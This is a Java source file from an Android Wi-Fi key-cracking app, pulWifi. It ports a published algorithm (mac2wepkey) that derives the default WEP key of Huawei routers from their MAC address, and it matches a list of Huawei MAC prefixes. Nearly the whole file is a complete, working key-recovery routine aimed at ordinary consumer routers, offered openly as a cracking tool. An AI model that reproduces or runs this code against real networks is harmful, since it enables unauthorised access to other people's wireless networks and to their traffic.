/*
 *  pulWifi , Copyright (C) 2011-2012 Javi Pulido / Antonio V�zquez
 *  
 *  This file is part of "pulWifi"
 *
 *  "pulWifi" is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  "pulWifi" is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with "pulWifi".  If not, see <http://www.gnu.org/licenses/>.
 */

package es.pulimento.wifi.core.algorithms;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Huawei algorithm.
 * Java adaptation of mac2wepkey.py from
 * Java adaptation of mac2wepkey.py from http://websec.ca/blog/view/mac2wepkey_huawei
 * Most MACs aren't confirmed.
 */
public class HuaweiAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public HuaweiAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	/**
	 * {@inheritDoc}
	 */
	@Override
	protected void setPatterns() {

		// Added all macs untill version 3 which will be focused on this.
		addPattern("(.*)", "(F4:C7:14:[0-9A-Fa-f:]{8})");
		// addPattern("", "(78:1D:BA:[0-9A-Fa-f:]{8})");// Confirmed, won't work
		addPattern("(.*)", "(64:16:F0:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(5C:4C:A9:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(54:A5:1B:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(54:89:98:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(4C:54:99:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(4C:1F:CC:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(40:4D:8E:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(30:87:30:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(28:6E:D4:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(28:5F:DB:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(24:DB:AC:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(20:F3:A3:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(20:2B:C1:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(1C:1D:67:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(10:C6:1F:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(0C:37:DC:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(08:19:A6:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(04:C0:6F:[0-9A-Fa-f:]{8})");
		// addPattern("", "(00:E0:FC:[0-9A-Fa-f:]{8})");// Confirmed, won't work
		addPattern("(.*)", "(00:25:9E:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(00:25:68:[0-9A-Fa-f:]{8})");// Confirmed as valid
		addPattern("(.*)", "(00:22:A1:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(00:1E:10:[0-9A-Fa-f:]{8})");// Confirmed as valid
		// addPattern("(.*)", "(00:19:15:[0-9A-Fa-f:]{8})");// Some WLAN_XXXX uses it, false positive!
		addPattern("(.*)", "(00:18:82:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(00:11:F5:[0-9A-Fa-f:]{8})");
		addPattern("(.*)", "(00:0F:E2:[0-9A-Fa-f:]{8})");
	}

	final int[] a0 = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	final int[] a1 = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };
	final int[] a2 = { 0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8 };
	final int[] a3 = { 0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10 };
	final int[] a4 = { 0, 5, 11, 14, 7, 2, 12, 9, 15, 10, 4, 1, 8, 13, 3, 6 };
	final int[] a5 = { 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12 };
	final int[] a6 = { 0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8 };
	final int[] a7 = { 0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11 };
	final int[] a8 = { 0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4 };
	final int[] a9 = { 0, 9, 2, 11, 5, 12, 7, 14, 10, 3, 8, 1, 15, 6, 13, 4 };
	final int[] a10 = { 0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 14 };
	final int[] a11 = { 0, 12, 8, 4, 1, 13, 9, 5, 2, 14, 10, 6, 3, 15, 11, 7 };
	final int[] a12 = { 0, 4, 9, 13, 2, 6, 11, 15, 4, 0, 13, 9, 6, 2, 15, 11 };
	final int[] a13 = { 0, 8, 1, 9, 3, 11, 2, 10, 6, 14, 7, 15, 5, 13, 4, 12 };
	final int[] a14 = { 0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11 };
	final int[] a15 = { 0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9 };
	final int[] n1 = { 0, 14, 10, 4, 8, 6, 2, 12, 0, 14, 10, 4, 8, 6, 2, 12 };
	final int[] n2 = { 0, 8, 0, 8, 3, 11, 3, 11, 6, 14, 6, 14, 5, 13, 5, 13 };
	final int[] n3 = { 0, 0, 3, 3, 2, 2, 1, 1, 4, 4, 7, 7, 6, 6, 5, 5 };
	final int[] n4 = { 0, 11, 12, 7, 15, 4, 3, 8, 14, 5, 2, 9, 1, 10, 13, 6 };
	final int[] n5 = { 0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14 };
	final int[] n6 = { 0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7 };
	final int[] n7 = { 0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6 };
	final int[] n8 = { 0, 5, 11, 14, 2, 7, 9, 12, 12, 9, 7, 2, 14, 11, 5, 0 };
	final int[] n9 = { 0, 0, 0, 0, 4, 4, 4, 4, 0, 0, 0, 0, 4, 4, 4, 4 };
	final int[] n10 = { 0, 8, 1, 9, 3, 11, 2, 10, 5, 13, 4, 12, 6, 14, 7, 15 };
	final int[] n11 = { 0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12 };
	final int[] n12 = { 0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9 };
	final int[] n13 = { 0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11 };
	final int[] n14 = { 0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10 };
	final int[] n15 = { 0, 6, 12, 10, 9, 15, 5, 3, 2, 4, 14, 8, 11, 13, 7, 1 };
	final int[] n16 = { 0, 11, 6, 13, 13, 6, 11, 0, 11, 0, 13, 6, 6, 13, 0, 11 };
	final int[] n17 = { 0, 12, 8, 4, 1, 13, 9, 5, 3, 15, 11, 7, 2, 14, 10, 6 };
	final int[] n18 = { 0, 12, 9, 5, 2, 14, 11, 7, 5, 9, 12, 0, 7, 11, 14, 2 };
	final int[] n19 = { 0, 6, 13, 11, 10, 12, 7, 1, 5, 3, 8, 14, 15, 9, 2, 4 };
	final int[] n20 = { 0, 9, 3, 10, 7, 14, 4, 13, 14, 7, 13, 4, 9, 0, 10, 3 };
	final int[] n21 = { 0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15 };
	final int[] n22 = { 0, 1, 2, 3, 5, 4, 7, 6, 11, 10, 9, 8, 14, 15, 12, 13 };
	final int[] n23 = { 0, 7, 15, 8, 14, 9, 1, 6, 12, 11, 3, 4, 2, 5, 13, 10 };
	final int[] n24 = { 0, 5, 10, 15, 4, 1, 14, 11, 8, 13, 2, 7, 12, 9, 6, 3 };
	final int[] n25 = { 0, 11, 6, 13, 13, 6, 11, 0, 10, 1, 12, 7, 7, 12, 1, 10 };
	final int[] n26 = { 0, 13, 10, 7, 4, 9, 14, 3, 8, 5, 2, 15, 12, 1, 6, 11 };
	final int[] n27 = { 0, 4, 9, 13, 2, 6, 11, 15, 5, 1, 12, 8, 7, 3, 14, 10 };
	final int[] n28 = { 0, 14, 12, 2, 8, 6, 4, 10, 0, 14, 12, 2, 8, 6, 4, 10 };
	final int[] n29 = { 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3 };
	final int[] n30 = { 0, 15, 14, 1, 12, 3, 2, 13, 8, 7, 6, 9, 4, 11, 10, 5 };
	final int[] n31 = { 0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5 };
	final int[] n32 = { 0, 10, 5, 15, 11, 1, 14, 4, 6, 12, 3, 9, 13, 7, 8, 2 };
	final int[] n33 = { 0, 4, 9, 13, 3, 7, 10, 14, 7, 3, 14, 10, 4, 0, 13, 9 };
	final int[] key = { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66 };
	final char[] ssid = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

	/**
	 * {@inheritDoc}
	 */
	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		// Remove dots from bssid and go lower case...
		bssid_data = bssid_data.replace(":", "").toLowerCase();

		int[] mac = new int[12];
		for (int i = 0; i < 12; ++i)
			mac[i] = Integer.parseInt(bssid_data.substring(i, i + 1), 16);

		int ya = (a2[mac[0]]) ^ (n11[mac[1]]) ^ (a7[mac[2]]) ^ (a8[mac[3]]) ^ (a14[mac[4]]) ^ (a5[mac[5]]) ^ (a5[mac[6]]) ^ (a2[mac[7]]) ^ (a0[mac[8]]) ^ (a1[mac[9]]) ^ (a15[mac[10]]) ^ (a0[mac[11]]) ^ 13;
		int yb = (n5[mac[0]]) ^ (n12[mac[1]]) ^ (a5[mac[2]]) ^ (a7[mac[3]]) ^ (a2[mac[4]]) ^ (a14[mac[5]]) ^ (a1[mac[6]]) ^ (a5[mac[7]]) ^ (a0[mac[8]]) ^ (a0[mac[9]]) ^ (n31[mac[10]]) ^ (a15[mac[11]]) ^ 4;
		int yc = (a3[mac[0]]) ^ (a5[mac[1]]) ^ (a2[mac[2]]) ^ (a10[mac[3]]) ^ (a7[mac[4]]) ^ (a8[mac[5]]) ^ (a14[mac[6]]) ^ (a5[mac[7]]) ^ (a5[mac[8]]) ^ (a2[mac[9]]) ^ (a0[mac[10]]) ^ (a1[mac[11]]) ^ 7;
		int yd = (n6[mac[0]]) ^ (n13[mac[1]]) ^ (a8[mac[2]]) ^ (a2[mac[3]]) ^ (a5[mac[4]]) ^ (a7[mac[5]]) ^ (a2[mac[6]]) ^ (a14[mac[7]]) ^ (a1[mac[8]]) ^ (a5[mac[9]]) ^ (a0[mac[10]]) ^ (a0[mac[11]]) ^ 14;
		int ye = (n7[mac[0]]) ^ (n14[mac[1]]) ^ (a3[mac[2]]) ^ (a5[mac[3]]) ^ (a2[mac[4]]) ^ (a10[mac[5]]) ^ (a7[mac[6]]) ^ (a8[mac[7]]) ^ (a14[mac[8]]) ^ (a5[mac[9]]) ^ (a5[mac[10]]) ^ (a2[mac[11]]) ^ 7;

		return Integer.toString(key[ya]) + Integer.toString(key[yb]) + Integer.toString(key[yc]) + Integer.toString(key[yd]) + Integer.toString(key[ye]);
	}

	/**
	 * {@inheritDoc}
	 */
	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return true;
	}

}
